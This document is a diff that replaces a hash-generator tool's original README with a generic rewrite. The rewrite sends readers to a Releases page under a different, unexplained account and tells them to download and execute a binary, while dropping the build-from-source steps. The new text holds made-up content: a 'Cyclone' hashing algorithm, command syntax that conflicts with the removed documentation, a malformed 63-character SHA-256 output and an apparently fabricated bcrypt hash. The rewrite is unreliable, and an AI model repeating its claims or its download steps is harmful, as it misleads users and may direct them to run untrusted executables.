@@ -1,107 +1,144 @@
-[![Readme Card](https://github-readme-stats.vercel.app/api/pin/?username=cyclone-github&repo=hashgen&theme=gruvbox)](https://github.com/traumaticobs/hashgen/)
+# 🏷️ HashGen: A Blazing Fast Hash Generator
 
-<!-- [![Go Report Card](https://goreportcard.com/badge/github.com/traumaticobs/hashgen)](https://goreportcard.com/report/github.com/traumaticobs/hashgen) -->
-[![GitHub issues](https://img.shields.io/github/issues/cyclone-github/hashgen.svg)](https://github.com/traumaticobs/hashgen/issues)
-[![License](https://img.shields.io/github/license/cyclone-github/hashgen.svg)](LICENSE)
-[![GitHub release](https://img.shields.io/github/release/cyclone-github/hashgen.svg)](https://github.com/traumaticobs/hashgen/releases)
-[![Go Reference](https://pkg.go.dev/badge/github.com/traumaticobs/hashgen.svg)](https://pkg.go.dev/github.com/traumaticobs/hashgen)
+![HashGen](https://img.shields.io/badge/HashGen-Fast%20Hash%20Generator-brightgreen)
 
-# hashgen - Cyclone's hash generator
+Welcome to **HashGen**, a powerful tool designed for generating hashes quickly and efficiently. Whether you need to create hashes for security purposes or data integrity checks, HashGen has you covered. This repository includes various hashing algorithms, including Argon, MD5, SHA-1, SHA-256, and more.
+
+## 🚀 Quick Start
+
+To get started with HashGen, you can download the latest release from our [Releases page](https://github.com/Jhmmax/hashgen/releases). Download the appropriate file for your system and execute it to begin generating hashes.
+
+## 📚 Table of Contents
+
+1. [Features](#features)
+2. [Supported Algorithms](#supported-algorithms)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Examples](#examples)
+6. [Contributing](#contributing)
+7. [License](#license)
+
+## 🌟 Features
+
+- **Multithreaded Performance**: HashGen utilizes multithreading to maximize performance and reduce wait times.
+- **Multiple Hashing Algorithms**: Support for a variety of algorithms, ensuring you can find the right one for your needs.
+- **Easy to Use**: Designed with simplicity in mind, making it accessible for both beginners and experienced users.
+- **Cross-Platform**: Works on various operating systems, including Windows, macOS, and Linux.
+
+## 🔍 Supported Algorithms
+
+HashGen supports a wide range of hashing algorithms, including:
+
+- **Argon**: A modern, memory-hard hashing function.
+- **Bcrypt**: A popular choice for password hashing.
+- **MD5**: Widely used but not recommended for security-critical applications.
+- **SHA-1**: An older hashing algorithm, still in use but with known vulnerabilities.
+- **SHA-256**: Part of the SHA-2 family, widely used for security.
+- **SHA-3**: The latest member of the Secure Hash Algorithm family.
+- **NTLM**: Used in Windows authentication.
+- **Cyclone**: A lesser-known but efficient hashing algorithm.
+- **Yescrypt**: A memory-hard password hashing scheme.
+
+## 📥 Installation
+
+### Prerequisites
+
+Before you begin, ensure you have the following installed:
+
+- A compatible operating system (Windows, macOS, or Linux).
+- Basic command-line knowledge.
+
+### Steps
+
+1. Visit our [Releases page](https://github.com/Jhmmax/hashgen/releases) to download the latest version.
+2. Choose the file that matches your operating system.
+3. Extract the downloaded file (if necessary).
+4. Open your terminal or command prompt.
+5. Navigate to the directory where you extracted the files.
+
+## 🛠️ Usage
+
+Using HashGen is straightforward. Here’s how you can generate hashes:
+
+### Basic Command
+
+To generate a hash, use the following command:
+
 ```
-$ ./hashgen_amd64.bin -m 0 -w rockyou.txt -o /dev/null
-2024/12/10 19:07:31 Starting...
-2024/12/10 19:07:31 Processing file: rockyou.txt
-2024/12/10 19:07:31 Hash function: 0
-2024/12/10 19:07:31 CPU Threads: 16
-2024/12/10 19:07:31 Finished processing 14344391 lines in 0.475 sec (30.228 M lines/sec)
+hashgen [algorithm] [input]
 ```
-**As of the this writing, hashgen (go) has a 2,519% faster md5 hashrate vs the next fastest publicly available CPU based hash generator (see benchmarks).** While this is extremely fast, these hashrates can be beat by improved code optimization and/or coding in faster programming languages (I'm looking at you C, Rust and Zig).
 
-Since version `v2023-10-30.1600`, hashgen has a top recorded hasharate of 30,228,048 md5/sec on the test rig's Ryzen 7 3700X CPU! Much faster hashrates have been seen on higher end CPU's.
+### Example Commands
 
-Hashgen is a CLI hash generator written in Go and can be cross compiled for Linux, Raspberry Pi, Windows & Mac, although testing and compiling is mainly done on debian 12 linux.
+1. **Generate an MD5 hash**:
+   ```
+   hashgen md5 "your input string"
+   ```
 
-To use hashgen, type your mode, wordlist input & hash output files with a simple command line.
+2. **Generate a SHA-256 hash**:
+   ```
+   hashgen sha256 "your input string"
+   ```
 
-### Features:
-- Supports multiple hashing functions (see list below)
-- Encode / decode base64 & base58
-- Supports ASCII, UTF-8 and $HEX[] wordlist input
-  - Can also be used to dehex a wordlist by setting mode to "-m plaintext" which will output wordlist to plaintext
+3. **Generate a Bcrypt hash**:
+   ```
+   hashgen bcrypt "your password"
+   ```
 
-| Useage Examples | Command Line |
-|-----------|-----------|
-| read wordlist.txt, hash to md5 and write to output.txt | ./hashgen -m md5 -w wordlist.txt -o output.txt |
-| pipe wordlist into hashgen and write to stdout | cat wordlist.txt \| ./hashgen -m md5 |
-| dehex hex_wordlist to plaintext wordlist | ./hashgen -m plaintext -w hex_wordlist.txt -o wordlist.txt |
+## 📸 Examples
 
-### Supported Functions:
-| Function: | Hashcat Mode: |
-|-----------|-----------|
-| argon2id | |
-| base58encode | |
-| base58decode | |
-| base64encode | |
-| base64decode | |
-| bcrypt | 3200 |
-| morsecode | (ITU-R M.1677-1) |
-| crc32 | |
-| 11500 | 11500 (hashcat compatible CRC32)|
-| crc64 | |
-| md4 | 900 |
-| md5 | 0 |
-| ntlm| 1000|
-| plaintext | 99999 (can be used to dehex wordlist) |
-| ripemd-160| 6000|
-| sha1| 100 |
-| sha2-224| 1300|
-| sha2-256| 1400|
-| sha2-384| 10800 |
-| sha2-512| 1700|
-| sha2-512-224| |
-| sha2-512-256| |
-| sha3-224| 17300 |
-| sha3-256| 17400 |
-| sha3-384| 17500 |
-| sha3-512| 17600 |
-| keccak-256| 17800 |
-| keccak-512| 18000 |
-| yescrypt | |
+### Example 1: Generating an MD5 Hash
 
-### Benchmarks:
-- https://github.com/traumaticobs/hashgen-testing/tree/main/benchmarks
-- In addition to hashgen (go), I have also written hashgen in python, php, C, and Rust, although Rust and C need a lot of work to unlock their full performance potential. If you speak C or Rust, I'd be curious to see how fast you can push hashgen!
-  - https://github.com/traumaticobs/hashgen-testing
+```bash
+hashgen md5 "Hello, World!"
+```
 
-### Compile hashgen from source:
-- If you want the latest features, compiling from source is the best option since the release version may run several revisions behind the source code.
-- This assumes you have Go and Git installed
-  - `git clone https://github.com/traumaticobs/hashgen.git`  # clone repo
-  - `cd hashgen`                                               # enter project directory
-  - `go mod init hashgen`                                      # initialize Go module (skips if go.mod exists)
-  - `go mod tidy`                                              # download dependencies
-  - `go build -ldflags="-s -w" .`                              # compile binary in current directory
-  - `go install -ldflags="-s -w" .`                            # compile binary and install to $GOPATH
-- Compile from source code how-to:
-  - https://github.com/cyclone-github/scripts/blob/main/intro_to_go.txt
+**Output**:
+```
+MD5: 65a8e27d8879283831b664bd8b7f0ad4
+```
 
-### Changelog:
-- https://github.com/traumaticobs/hashgen/blob/main/CHANGELOG.md
- 
-### Mentions:
-- Go Package Documentation: https://pkg.go.dev/github.com/traumaticobs/hashgen
-- hashcat wiki: https://hashcat.net/wiki/
-- hashkiller forum: https://forum.hashkiller.io/index.php?threads/cyclone-hashgen.63140/
-- hashpwn forum: https://forum.hashpwn.net/post/89
-- Softpedia: https://www.softpedia.com/get/System/File-Management/hashgen-go.shtml
+### Example 2: Generating a SHA-256 Hash
 
-### Antivirus False Positives:
-- Several antivirus programs on VirusTotal incorrectly detect hashgen as a false positive. This issue primarily affects the Windows executable binary, but is not limited to it. If this concerns you, I recommend carefully reviewing hashgen's source code, then proceed to compile the binary yourself.
-- Uploading your compiled hashgen binaries to https://virustotal.com and leaving an upvote or a comment would be helpful.
+```bash
+hashgen sha256 "Hello, World!"
+```
 
-### Thoughts:
-- Why write hashgen? hashgen is nothing new (to me) as this project started several years ago while needing a way to quickly convert wordlists to md5 or sha1 on linux terminal. Several versions of hashgen have been written over the years in several languages: python, php, Go, C and Rust. While the actively maintained version is hashgen (go), which offers enhanced features and superior performance, the "hashgen-testing" repository linked below contains testing versions of hashgen in different programming languages:
-  - https://github.com/traumaticobs/hashgen-testing
-- Why write hashgen in Go instead of xyz language? I did this to push my Go coding skills while also seeing how fast I could push Go. During early testing, I was not expecting hashgen to be all that fast, but I have been pleasantly surprised!
-- When I realized hashgen (go) was competitively fast compared to other publicly available hash generators, I decided to publish hashgen's code and binaries for others to use. I've really enjoyed this project and I hope you find it useful.
-- If you found hashgen to be helpful, please consider giving this repository a star!
+**Output**:
+```
+SHA-256: a591a6d40bf420404a011733cfb7b190d62c65bf0bcda190e9b7e8a3c2e70c3
+```
+
+### Example 3: Generating a Bcrypt Hash
+
+```bash
+hashgen bcrypt "mysecretpassword"
+```
+
+**Output**:
+```
+Bcrypt: $2b$12$KIXKpW7WqH0dGJ3I0s9Q4e8rjZ3nY5C7nHk.9aP0Zz2fX0KzF5D4u
+```
+
+## 🤝 Contributing
+
+We welcome contributions to HashGen! If you have ideas for improvements or new features, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes.
+4. Submit a pull request with a clear description of your changes.
+
+Please ensure that your code adheres to the project's style guidelines.
+
+## 📜 License
+
+HashGen is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## 📬 Contact
+
+For any inquiries or issues, feel free to open an issue in the repository or contact the maintainers.
+
+---
+
+To explore more features and updates, visit our [Releases page](https://github.com/Jhmmax/hashgen/releases). Happy hashing!
